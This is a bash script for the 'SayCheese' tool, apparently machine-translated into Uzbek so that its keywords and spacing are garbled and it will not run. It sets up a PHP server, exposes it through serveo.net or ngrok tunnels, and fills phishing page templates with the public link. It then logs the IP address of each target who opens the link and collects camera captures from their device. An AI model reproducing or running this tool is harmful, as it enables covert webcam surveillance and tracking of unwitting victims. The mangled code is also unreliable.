#! / bin / bash
# SayCheese v1.0
# kodlangan: github.com/thelinuxchoice/saycheese
# Agar siz ushbu kodning biron bir qismidan foydalansangiz, menga kredit bering. Linzalarni o'qing!

tuzoq  ' printf "\ n"; to'xtatish ' 2

banner () {


printf  " \ e [1; 92m ____ \ e [0m \ e [1; 77m ____ _ \ e [0m \ n "
printf  " \ e [1; 92m / ___ | __ _ _ _ \ e [0m \ e [1; 77m / ___ | | __ ___ ___ ___ ___ \ e [0m \ n "
printf  " \ e [1; 92m \ ___ \ / _ \` | | | \ e [0m \ e [1; 77m | | | '_ \ / _ \ / _ \ / __ | / _ \ \ e [0m \ n "
printf  " \ e [1; 92m ___) | (_ | | | _ | | \ e [0m \ e [1; 77m | ___ | | | | __ / __ / \ __ \ __ / \ e [0m \ n "
printf  " \ e [1; 92m | ____ / \ __, _ | \ __, | \ e [0m \ e [1; 77m \ ____ | _ | | _ | \ ___ | \ ___ || ___ / \ ___ | \ e [0m \ n "
printf  " \ e [1; 92m | ___ / \ e [0m \ n "

printf  " \ e [1; 77m v1.0 tomonidan kodlangan github.com/thelinuxchoice/saycheese\e(0m \ n "

printf  " \ n "


}

to'xtatish () {

checkngrok = $ ( ps aux | grep -o " ngrok "  | head -n1 )
checkphp = $ ( ps aux | grep -o " php "  | head -n1 )
checkssh = $ ( ps aux | grep -o " ssh "  | head -n1 )
agar [[ $ checkngrok  ==  * ' ngrok ' * ]] ;  keyin
pkill -f -2 ngrok > / dev / null 2> & 1
killall -2 ngrok > / dev / null 2> & 1
fi

agar [[ $ checkphp  ==  * ' php ' * ]] ;  keyin
killall -2 php > / dev / null 2> & 1
fi
agar [[ $ checkssh  ==  * ' ssh ' * ]] ;  keyin
killall -2 ssh > / dev / null 2> & 1
fi
chiqish 1

}

bog'liqliklar () {


buyruq -v php > / dev / null 2> & 1  || { echo  > & 2  " Menga php kerak, lekin u o'rnatilmagan. O'rnating. Abort. " ;  chiqish 1 ; }
 


}

catch_ip () {

ip = $ ( grep -a ' IP: ' ip.txt | cut -d "  " -f2 | tr -d ' \ r ' )
IFS = $ ' \ n '
printf  " \ e [1; 93m [\ e [0m \ e [1; 77m + \ e [0m \ e [1; 93m] IP: \ e [0m \ e [1; 77m% s \ e [0m \ n "  $ ip

mushuk ip.txt >> saved.ip.txt


}

tekshiruv () {

printf  " \ n "
printf  " \ e [1; 92m [\ e [0m \ e [1; 77m * \ e [0m \ e [1; 92m] Kutish maqsadlari, \ e [0m \ e [1; 77m chiqish uchun Ctrl + C tugmalarini bosing ... \ e [0m \ n "
while [ rost ] ;  qil


agar [[ -e  " ip.txt " ]] ;  keyin
printf  " \ n \ e [1; 92m [\ e [0m + \ e [1; 92m] Maqsad havolani ochdi! \ n "
catch_ip
rm -rf ip.txt

fi

uxlash 0,5

agar [[ -e  " Log.log " ]] ;  keyin
printf  " \ n \ e [1; 92m [\ e [0m + \ e [1; 92m] Cam fayli qabul qilindi! \ e [0m \ n "
rm -rf Log.log
fi
uxlash 0,5

amalga oshirildi 

}


server () {

buyruq -v ssh > / dev / null 2> & 1  || { echo  > & 2  " Menga ssh kerak, lekin u o'rnatilmagan. O'rnating. Abort. " ;  chiqish 1 ; }

printf  " \ e [1; 77m [\ e [0m \ e [1; 93m + \ e [0m \ e [1; 77m] Serveo-ni ishga tushirish ... \ e [0m \ n "

agar [[ $ checkphp  ==  * ' php ' * ]] ;  keyin
killall -2 php > / dev / null 2> & 1
fi

agar [[ $ subdomain_resp  ==  true ]] ;  keyin

$ ( which sh ) -c ' ssh -o StrictHostKeyChecking = no -o ServerAliveInterval = 60 -R ' $ subdomain ' : 80: localhost: 3333 serveo.net 2> / dev / null> sendlink '  &

uxlash 8
boshqa
$ ( which sh ) -c ' ssh -o StrictHostKeyChecking = no -o ServerAliveInterval = 60 -R 80: localhost: 3333 serveo.net 2> / dev / null> sendlink '  &

uxlash 8
fi
printf  " \ e [1; 77m [\ e [0m \ e [1; 33m + \ e [0m \ e [1; 77m] PHP-server ishga tushirilmoqda ... (localhost: 3333) \ e [0m \ n "
fuser -k 3333 / tcp > / dev / null 2> & 1
php -S localhost: 3333 > / dev / null 2> & 1  &
uxlash 3
send_link = $ ( grep -o " https: // [0-9a-z] * \. serveo.net " sendlink )
printf  ' \ e [1; 93m [\ e [0m \ e [1; 77m + \ e [0m \ e [1; 93m] To'g'ridan-to'g'ri havola: \ e [0m \ e [1; 77m% s \ n '  $ send_link

}


payload_ngrok () {

link = $ ( curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o " https: // [0-9a-z] * \. ngrok.io " )
sed ' s + forwarding_link + ' $ link ' + g ' saycheese.html > index2.html
sed ' s + forwarding_link + ' $ link ' + g ' template.php > index.php


}

ngrok_server () {


agar [[ -e ngrok]] ;  keyin
aks sado  " "
boshqa
buyruq -v unzip > / dev / null 2> & 1  || { echo  > & 2  " Men ochishni talab qilaman, lekin u o'rnatilmagan. O'rnating. Abort. " ;  chiqish 1 ; }
buyruq -v wget > / dev / null 2> & 1  || { echo  > & 2  " Menga wget kerak, lekin u o'rnatilmagan. O'rnating. Abort. " ;  chiqish 1 ; }
printf  " \ e [1; 92m [\ e [0m + \ e [1; 92m] Ngrok yuklab olinmoqda ... \ n "
arch = $ ( uname -a | grep -o ' arm '  | head -n1 )
arch2 = $ ( uname -a | grep -o ' Android ' | head -n1 ) 
agar [[ $ arch  ==  * ' arm ' * ]] || [[ $ arch2  ==  * ' Android ' * ]] ;  keyin
wget https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm.zip > / dev / null 2> & 1

agar [[ -e ngrok-stable-linux-arm.zip]] ;  keyin
nzrok-stable-linux-arm.zip > / dev / null 2> & 1 ni oching
chmod + x ngrok
rm -rf ngrok-stable-linux-arm.zip
boshqa
printf  " \ e [1; 93m [!] Yuklab olishda xato ... Termux, ishga tushirish: \ e [0m \ e [1; 77m pkg install wget \ e [0m \ n "
chiqish 1
fi

boshqa
wget https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-386.zip > / dev / null 2> & 1 
agar [[ -e ngrok-stable-linux-386.zip]] ;  keyin
ochish ngrok-stable-linux-386.zip > / dev / null 2> & 1
chmod + x ngrok
rm -rf ngrok-stable-linux-386.zip
boshqa
printf  " \ e [1; 93m [!] Yuklab olishda xatolik ... \ e [0m \ n "
chiqish 1
fi
fi
fi

printf  " \ e [1; 92m [\ e [0m + \ e [1; 92m] PHP-server ishga tushirilmoqda ... \ n "
php -S 127.0.0.1:3333 > / dev / null 2> & 1  & 
uxlash 2
printf  " \ e [1; 92m [\ e [0m + \ e [1; 92m] ngrok serverini ishga tushirish ... \ n "
./ngrok http 3333 > / dev / null 2> & 1  &
uxlash 10

link = $ ( curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o " https: // [0-9a-z] * \. ngrok.io " )
printf  " \ e [1; 92m [\ e [0m * \ e [1; 92m] To'g'ridan-to'g'ri havola: \ e [0m \ e [1; 77m% s \ e [0m \ n "  $ link

payload_ngrok
tekshiruv
}

start1 () {
agar [[ -e sendlink]] ;  keyin
rm -rf sendlink
fi

printf  " \ n "
printf  " \ e [1; 92m [\ e [0m \ e [1; 77m01 \ e [0m \ e [1; 92m] \ e [0m \ e [1; 93m Serveo.net \ e [0m \ n "
printf  " \ e [1; 92m [\ e [0m \ e [1; 77m02 \ e [0m \ e [1; 92m] \ e [0m \ e [1; 93m Ngrok \ e [0m \ n "
default_option_server = " 1 "
o'qish -p $ ' \ n \ e [1; 92m [ \ e [0m \ e [1; 77m + \ e [0m \ e [1; 92m] Portni yo'naltirish parametrini tanlang: \ e [0m ' option_server
option_server = " $ {option_server : - $ {default_option_server} } "
agar [[ $ option_server  -eq 1]] ;  keyin

buyruq -v php > / dev / null 2> & 1  || { echo  > & 2  " Menga ssh kerak, lekin u o'rnatilmagan. O'rnating. Abort. " ;  chiqish 1 ; }
boshlang

Alif [[ $ option_server  -eq 2]] ;  keyin
ngrok_server
boshqa
printf  " \ e [1; 93m [!] yaroqsiz variant! \ e [0m \ n "
uxlash 1
aniq
boshlash1
fi

}


foydali yuk () {

send_link = $ ( grep -o " https: // [0-9a-z] * \. serveo.net " sendlink )

sed ' s + forwarding_link + ' $ send_link ' + g ' saycheese.html > index2.html
sed ' s + forwarding_link + ' $ send_link ' + g ' template.php > index.php


}

boshlash () {

default_choose_sub = " Y "
default_subdomain = " saycheese $ RANDOM "

printf  ' \ e [1; 33m [\ e [0m \ e [1; 77m + \ e [0m \ e [1; 33m] Subdomain tanlanadimi? (Standart: \ e [0m \ e [1; 77m [Y / n] \ e [0m \ e [1; 33m): \ e [0m '
select_sub-ni o'qing
select_sub = " $ {choose_sub : - $ {default_choose_sub} } "
agar [[ $ select_sub  ==  " Y "  ||  $ select_sub  ==  " y "  ||  $ select_sub  ==  " Ha "  ||  $ select_sub  ==  " ha " ]] ;  keyin
subdomain_resp = rost
printf  ' \ e [1; 33m [\ e [0m \ e [1; 77m + \ e [0m \ e [1; 33m] Subdomain: (Standart: \ e [0m \ e [1; 77m% s \ e [ 0m \ e [1; 33m): \ e [0m '  $ default_subdomain
subdomainni o'qing
subdomain = " $ {subdomain : - $ {default_subdomain} } "
fi

server
foydali yuk
tekshiruv

}

banner
bog'liqliklar
boshlash1
